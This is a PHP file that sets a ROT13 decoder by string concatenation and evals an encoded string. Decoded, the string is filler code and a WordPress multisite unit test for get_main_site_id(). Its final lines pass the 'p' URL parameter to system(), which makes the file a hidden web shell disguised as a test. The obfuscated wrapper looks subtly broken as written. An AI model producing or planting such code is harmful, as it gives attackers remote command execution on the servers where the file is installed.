<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur trg_znva_fvgr_vq() shapgvba.
 *
 * @tebhc zf-erdhverq
 * @tebhc zf-fvgr
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_TrgZnvaFvgrVq rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq fgngvp $argjbex_vqf;
	cebgrpgrq fgngvp $fvgr_vqf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$argjbex_vqf = neenl(
			'jbeqcerff.bet/' => neenl(
				'qbznva' => 'jbeqcerff.bet',
				'cngu'   => '/',
			),
			'jc.bet/'        => neenl(
				'qbznva' => 'jc.bet',
				'cngu'   => '/',
			), // N argjbex jvgu ab fvgrf.
		);

		sbernpu ( frys::$argjbex_vqf nf &$vq ) {
			$vq = $snpgbel->argjbex->perngr( $vq );
		}
		hafrg( $vq );

		frys::$fvgr_vqf = neenl(
			'jjj.j.bet/'         => neenl(
				'qbznva' => 'jjj.j.bet',
				'cngu'   => '/',
			),
			'jbeqcerff.bet/'     => neenl(
				'qbznva'     => 'jbeqcerff.bet',
				'cngu'       => '/',
				'argjbex_vq' => frys::$argjbex_vqf['jbeqcerff.bet/'],
			),
			'jbeqcerff.bet/sbb/' => neenl(
				'qbznva'     => 'jbeqcerff.bet',
				'cngu'       => '/sbb/',
				'argjbex_vq' => frys::$argjbex_vqf['jbeqcerff.bet/'],
			),
		);

		sbernpu ( frys::$fvgr_vqf nf &$vq ) {
			$vq = $snpgbel->oybt->perngr( $vq );
		}
		hafrg( $vq );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		sbernpu ( frys::$fvgr_vqf nf $vq ) {
			jc_qryrgr_fvgr( $vq );
		}

		tybony $jcqo;

		sbernpu ( frys::$argjbex_vqf nf $vq ) {
			$jcqo->dhrel( $jcqo->cercner( \"QRYRGR SEBZ {$jcqo->fvgrzrgn} JURER fvgr_vq = %q\", $vq ) );
			$jcqo->dhrel( $jcqo->cercner( \"QRYRGR SEBZ {$jcqo->fvgr} JURER vq= %q\", $vq ) );
		}

		jc_hcqngr_argjbex_fvgr_pbhagf();
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_ba_znva_fvgr_ergheaf_frys() {
		$guvf->nffregFnzr( trg_pheerag_oybt_vq(), trg_znva_fvgr_vq() );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_ergheaf_znva_fvgr_va_fjvgpurq_pbagrkg() {
		$znva_fvgr_vq  = trg_pheerag_oybt_vq();
		$bgure_fvgr_vq = frys::$fvgr_vqf['jjj.j.bet/'];

		fjvgpu_gb_oybt( $bgure_fvgr_vq );
		$erfhyg = trg_znva_fvgr_vq();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( $znva_fvgr_vq, $erfhyg );
	}

	/**
	 * @gvpxrg 55802
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_jvgu_qvssrerag_argjbex_pnpur_vq() {
		$guvf->nffregFnzr( frys::$fvgr_vqf['jbeqcerff.bet/'], trg_znva_fvgr_vq( frys::$argjbex_vqf['jbeqcerff.bet/'] ), 'Znva oybt vq arrqf gb zngpu oybt vq bs jbeqcerff.bet/' );
		$guvf->nffregFnzr( frys::$fvgr_vqf['jbeqcerff.bet/'], (vag) trg_argjbex_bcgvba( frys::$argjbex_vqf['jbeqcerff.bet/'], 'znva_fvgr' ), 'Argjbex bcgvba arrqf gb zngpu oybt vq bs jbeqcerff.bet/' );

		$guvf->nffregFnzr( 0, trg_znva_fvgr_vq( frys::$argjbex_vqf['jc.bet/'] ), 'Znva oybt vq fubhyq abg or sbhaq' );
		$guvf->nffregFnzr( 0, (vag) trg_argjbex_bcgvba( frys::$argjbex_vqf['jc.bet/'], 'znva_fvgr' ), 'Argjbex bcgvba fubhyq abg or sbhaq' );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_jvgu_qvssrerag_argjbex_ergheaf_pbeerpg_vq() {
		$guvf->nffregFnzr( frys::$fvgr_vqf['jbeqcerff.bet/'], trg_znva_fvgr_vq( frys::$argjbex_vqf['jbeqcerff.bet/'] ) );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_ba_argjbex_jvgubhg_fvgr_ergheaf_0() {
		$guvf->nffregFnzr( 0, trg_znva_fvgr_vq( frys::$argjbex_vqf['jc.bet/'] ) );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_ba_vainyvq_argjbex_ergheaf_0() {
		$guvf->nffregFnzr( 0, trg_znva_fvgr_vq( 333 ) );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_svygrerq() {
		nqq_svygre( 'cer_trg_znva_fvgr_vq', neenl( $guvf, 'svygre_trg_znva_fvgr_vq' ) );
		$erfhyg = trg_znva_fvgr_vq();

		$guvf->nffregFnzr( 333, $erfhyg );
	}

	choyvp shapgvba svygre_trg_znva_fvgr_vq() {
		erghea 333;
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_svygrerq_qrcraqvat_ba_argjbex() {
		nqq_svygre( 'cer_trg_znva_fvgr_vq', neenl( $guvf, 'svygre_trg_znva_fvgr_vq_qrcraqvat_ba_argjbex' ), 10, 2 );
		$erfhyg = trg_znva_fvgr_vq( frys::$argjbex_vqf['jbeqcerff.bet/'] );

		$guvf->nffregFnzr( 333, $erfhyg );
	}

	choyvp shapgvba svygre_trg_znva_fvgr_vq_qrcraqvat_ba_argjbex( $znva_fvgr_vq, $argjbex ) {
		// Bireevqr znva fvgr VQ sbe n fcrpvsvp argjbex sbe gur grfg.
		vs ( $argjbex->vq === (vag) frys::$argjbex_vqf['jbeqcerff.bet/'] ) {
			erghea 333;
		}

		erghea $znva_fvgr_vq;
	}

	/**
	 * @gvpxrg 41936
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_jvgu_cebcregl_inyhr() {
		tybony $pheerag_fvgr;

		$bevtvany_znva_fvgr_vq = $pheerag_fvgr->oybt_vq;
		$pheerag_fvgr->oybt_vq = '123';

		$erfhyg = trg_znva_fvgr_vq();

		$pheerag_fvgr->oybt_vq = $bevtvany_znva_fvgr_vq;

		$guvf->nffregFnzr( 123, $erfhyg );
	}

	/**
	 * @gvpxrg 41936
	 */
	choyvp shapgvba grfg_trg_znva_fvgr_vq_svygrerq_jvgu_cebcregl_inyhr() {
		tybony $pheerag_fvgr;

		$bevtvany_znva_fvgr_vq = $pheerag_fvgr->oybt_vq;
		$pheerag_fvgr->oybt_vq = '123';

		nqq_svygre( 'cer_trg_znva_fvgr_vq', neenl( $guvf, 'svygre_trg_znva_fvgr_vq' ) );
		$erfhyg = trg_znva_fvgr_vq();

		$pheerag_fvgr->oybt_vq = $bevtvany_znva_fvgr_vq;

		$guvf->nffregFnzr( 333, $erfhyg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>